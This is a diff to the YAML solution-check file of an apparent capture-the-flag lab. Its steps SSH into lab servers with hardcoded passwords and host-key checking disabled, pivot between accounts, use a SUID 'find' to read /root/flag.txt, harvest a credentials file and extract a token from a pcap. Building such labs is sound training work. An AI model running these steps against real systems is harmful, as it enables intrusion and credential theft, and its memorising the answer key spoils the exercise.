@@ -121,27 +121,27 @@ test:
       timeout: 10
 
     - name: "SSH to server-bravo as contractor and pivot to sysadmin for token 2"
-      command: "sshpass -p 'T1t4n_Sys_2024#' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null sysadmin@{target.server-bravo} 'cat /home/sysadmin/marker.txt' 2>/dev/null"
+      command: "sshpass -p 'T1t4n_Sys_2024#' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null sysadmin@{target.server-bravo} 'cat /home/sysadmin/marker.txt' 2>&1"
       expect: "bl4ck"
       timeout: 15
 
     - name: "SSH to server-charlie as operator"
-      command: "sshpass -p 'T1t4n_0ps_2024#' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null operator@{target.server-charlie} 'whoami' 2>/dev/null"
+      command: "sshpass -p 'T1t4n_0ps_2024#' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null operator@{target.server-charlie} 'whoami' 2>&1"
       expect: "operator"
       timeout: 15
 
     - name: "SUID find exploit to read token 3 from /root/flag.txt"
-      command: "sshpass -p 'T1t4n_0ps_2024#' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null operator@{target.server-charlie} 'find /root -name flag.txt -exec cat {} \\;' 2>/dev/null"
+      command: "sshpass -p 'T1t4n_0ps_2024#' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null operator@{target.server-charlie} 'find /root -name flag.txt -exec cat {} \\;' 2>&1"
       expect: "b0x"
       timeout: 15
 
     - name: "Read analyst credentials from server-charlie"
-      command: "sshpass -p 'T1t4n_0ps_2024#' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null operator@{target.server-charlie} 'find /opt/titan -name credentials.txt -exec cat {} \\;' 2>/dev/null | grep -o 'T1t4n_4n4lyst#'"
+      command: "sshpass -p 'T1t4n_0ps_2024#' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null operator@{target.server-charlie} 'find /opt/titan -name credentials.txt -exec cat {} \\;' 2>&1 | grep -o 'T1t4n_4n4lyst#'"
       expect: "T1t4n_4n4lyst#"
       timeout: 15
 
     - name: "SSH to server-delta and extract token 4 from PCAP"
-      command: "sshpass -p 'T1t4n_4n4lyst#' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null analyst@{target.server-delta} 'strings /home/analyst/evidence/traffic.pcap | grep -o \"token=pwn\" | head -1 | sed \"s/token=//\"' 2>/dev/null"
+      command: "sshpass -p 'T1t4n_4n4lyst#' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null analyst@{target.server-delta} 'strings /home/analyst/evidence/traffic.pcap | grep -o \"token=pwn\" | head -1 | sed \"s/token=//\"' 2>&1"
       expect: "pwn"
       timeout: 15
 
